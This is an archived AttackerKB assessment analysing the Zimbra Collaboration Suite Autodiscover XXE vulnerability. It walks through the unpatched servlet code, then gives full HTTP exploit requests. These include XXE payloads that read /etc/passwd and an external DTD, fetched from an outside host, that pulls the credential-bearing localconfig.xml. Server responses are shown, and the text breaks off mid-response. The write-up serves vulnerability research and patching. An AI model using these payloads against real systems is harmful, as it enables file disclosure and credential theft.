---
title: Zimbra Collaboration Suite Autodiscover XXE
author: jrobles-r7
score: 1
topic_attacker_value: 4
topic_exploitability: 3
topic_disclosure_date: '2019-05-29T22:29:00'
created: '2019-05-09T17:57:15.478695'
revision_date: '2020-03-15T04:22:22.595044'
assessment_id: c5767bc6-c204-4b99-ab97-3ca67e66b759
topic_id: 0de629aa-dabb-4803-9039-23808f323aaf
topic_short_id: 7bMNsBStux
topic_slug: zimbra-collaboration-suite-autodiscover-xxe
akb_topic_url: https://attackerkb.com/topics/7bMNsBStux/zimbra-collaboration-suite-autodiscover-xxe
akb_assessment_url: https://attackerkb.com/topics/7bMNsBStux/zimbra-collaboration-suite-autodiscover-xxe#c5767bc6-c204-4b99-ab97-3ca67e66b759
author_ratings:
  attacker-value: 4
  confidence-in-ratings: 3
  effort-to-develop-exploit: 3
  exploitability: 3
  urgent-to-patch: 5
  used-successfully: 5
---

# Zimbra Collaboration Suite Autodiscover XXE

*Assessment by jrobles-r7, archived from [AttackerKB](https://attackerkb.com/topics/7bMNsBStux/zimbra-collaboration-suite-autodiscover-xxe#c5767bc6-c204-4b99-ab97-3ca67e66b759).*

---

## Details

According to the blog post [A Saga of Code Executions on Zimbra](https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html) by An Trinh the XXE vulnerability occurs during the handling of Autodiscover requests. The commit diff for the changes that fixed the XXE issue can be found in Zimbra's github page for the [zm-mailbox repository](https://github.com/Zimbra/zm-mailbox/commit/e859950cea04f93ea101a6bdcc7ac4912efcef8e#diff-d9e2be9710e802c4002ed02015522784). In the `AutoDiscoverServlet.java` file the changes show modifications to wrap `DocumentBuilderFactory` in a function that disables multiple features for the instantiated factory.

By viewing the `AutoDiscoverServlet.java` file before the changes and tracking how `DocumentBuilderFactory` is used we can find the XXE vulnerability. One instance of `DocumentBuilderFactory` is in the `doPost` function. Lines 168-201 shows the beginning of the `doPost` function.

```
168     public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
169         ZimbraLog.clearContext();
170         addRemoteIpToLoggingContext(req);
171
172         log.info("Handling autodiscover request...");
173
174         byte[] reqBytes = null;
175         reqBytes = ByteUtil.getContent(req.getInputStream(), req.getContentLength());
176         if (reqBytes == null) {
177             log.warn("No content found in the request");
178             sendError(resp, 600, "No content found in the request");
179             return;
180         }
181         String content = new String(reqBytes, "UTF-8");
<snip>
196
197         try {
198             DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();
199             DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();
200             Document doc = docBuilder.parse(new InputSource(new StringReader(content)));
201             NodeList nList = doc.getElementsByTagName("Request");
```

On line 200 the request body contents are parse by the application. Since the request contents are parse on line 200 before any other checks (other than an empty contents check) we should be able to get XXE at this location of the code. The following request will trigger the XXE:

```
POST /service/autodiscover HTTP/1.1
Host: zimbra.mylocaldomain.local:8443
Content-Length: 102


<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % test SYSTEM "http://172.22.222.136:8000/test">
%test;]>
```

The following is the response from the server:

```
HTTP/1.1 400 Body cannot be parsed
Date: Tue, 02 Apr 2019 13:14:39 GMT
Content-Type: text/html;charset=iso-8859-1
Cache-Control: must-revalidate,no-cache,no-store
Content-Length: 276

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 400 Body cannot be parsed</title>
</head>
<body><h2>HTTP ERROR 400</h2>
<p>Problem accessing /service/autodiscover. Reason:
<pre>    Body cannot be parsed</pre></p>
</body>
</html>
```

Although the response does not contain any useful information, we can see that the server reached out to request the file specified in the `test` entity:

```
$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
172.22.222.111 - - [02/Apr/2019 08:13:26] code 404, message File not found
172.22.222.111 - - [02/Apr/2019 08:13:26] "GET /test HTTP/1.1" 404 -
```

Since we can get the application to reach out for a file we can include an external DTD file to include additional entities. However, An Trinh's blog post mentions that the vulnerability allows direct file extraction through the response. Our response does not contain anything useful so far. In lines 203-234 we can see xml data being checked for `EmailAddress` and `AcceptableResponseSchema`. There are also some error checks based on the data in those fields.

```
203             for (int i = 0; i < nList.getLength(); i++) {
204                 Node node = nList.item(i);
205                 if (node.getNodeType() == Node.ELEMENT_NODE) {
206                     Element element = (Element) node;
207                     email = getTagValue("EMailAddress", element);
208                     responseSchema = getTagValue("AcceptableResponseSchema", element);
209
210                     if (email != null)
211                         break;
212                 }
213             }
214         } catch (Exception e) {
215             log.warn("cannot parse body: %s", content);
216             sendError(resp, HttpServletResponse.SC_BAD_REQUEST, "Body cannot be parsed");
217             return;
218         }
219
220         //Return an error if there's no email address specified!
221         if (email == null || email.length() == 0) {
222             log.warn("No Email address is specified in the Request, %s", content);
223             sendError(resp, HttpServletResponse.SC_BAD_REQUEST, "No Email address is specified in the Request");
224             return;
225         }
226
227         //Return an error if the response schema doesn't match ours!
228         if (responseSchema != null && responseSchema.length() > 0) {
229
230             if (!(responseSchema.equals(NS_MOBILE) || responseSchema.equals(NS_OUTLOOK))) {
231                 log.warn("Requested response schema not available " + responseSchema);
232                 sendError(resp, HttpServletResponse.SC_SERVICE_UNAVAILABLE,
233                         "Requested response schema not available " + responseSchema);
234                 return;
```

Checks for the data in `EMailAddress` and `AcceptableResponseSchema` are performed on lines 221, 228, and 230. If a response schema is specified but it is not one of the predefined values then lines 232-233 are executed, which includes the provided response schema in the error messages. The following request can be used to verify the described behavior:

```
POST /service/autodiscover HTTP/1.1
Host: zimbra.mylocaldomain.local:8443
Content-Length: 117

<Request>
<EMailAddress>email</EMailAddress>
<AcceptableResponseSchema>mytest</AcceptableResponseSchema>
</Request>
```

As shown in the following response `mytest` is reflected back:

```
HTTP/1.1 503 Requested response schema not available mytest
Date: Tue, 02 Apr 2019 13:34:59 GMT
Content-Type: text/html;charset=iso-8859-1
Cache-Control: must-revalidate,no-cache,no-store
Content-Length: 326

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 503 Requested response schema not available mytest</title>
</head>
<body><h2>HTTP ERROR 503</h2>
<p>Problem accessing /service/autodiscover. Reason:
<pre>    Requested response schema not available mytest</pre></p>
</body>
</html>
```

To retrieve a file from the system we can define an entity and include it as the `AcceptableResponseSchema` as shown in the following request:

```
POST /service/autodiscover HTTP/1.1
Host: zimbra.mylocaldomain.local:8443
Content-Length: 198

<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY test SYSTEM "file:///etc/passwd">]>
<Request>
<EMailAddress>email</EMailAddress>
<AcceptableResponseSchema>&test;</AcceptableResponseSchema>
</Request>
```

The response will contain the data in `/etc/passwd`:

```
<snip>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 503 Requested response schema not available root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
<snip>
```

The blog post mentioned retrieving the `localconfig.xml` file to get credentials. To read the `localconfig.xml` file an external DTD file was used. The following request was used:

```
POST /service/autodiscover HTTP/1.1
Host: zimbra.mylocaldomain.local:8443
Content-Length: 229

<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % remote SYSTEM "http://172.22.222.136:8000/test">
%remote;
]>
<Request>
<EMailAddress>email</EMailAddress>
<AcceptableResponseSchema>&myfile;</AcceptableResponseSchema>
</Request>
```

The `myfile` entity is defined in the external DTD. The full contents of the external DTD is the following:

```
<!ENTITY % test SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
<!ENTITY % eval "<!ENTITY myfile '<![CDATA[%test;]]>'>">
%eval;
```

The following is a partial server response:

```
<snip>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 503 Requested response schema not available &lt;localconfig&gt;
  &lt;key name=&quot;ssl_
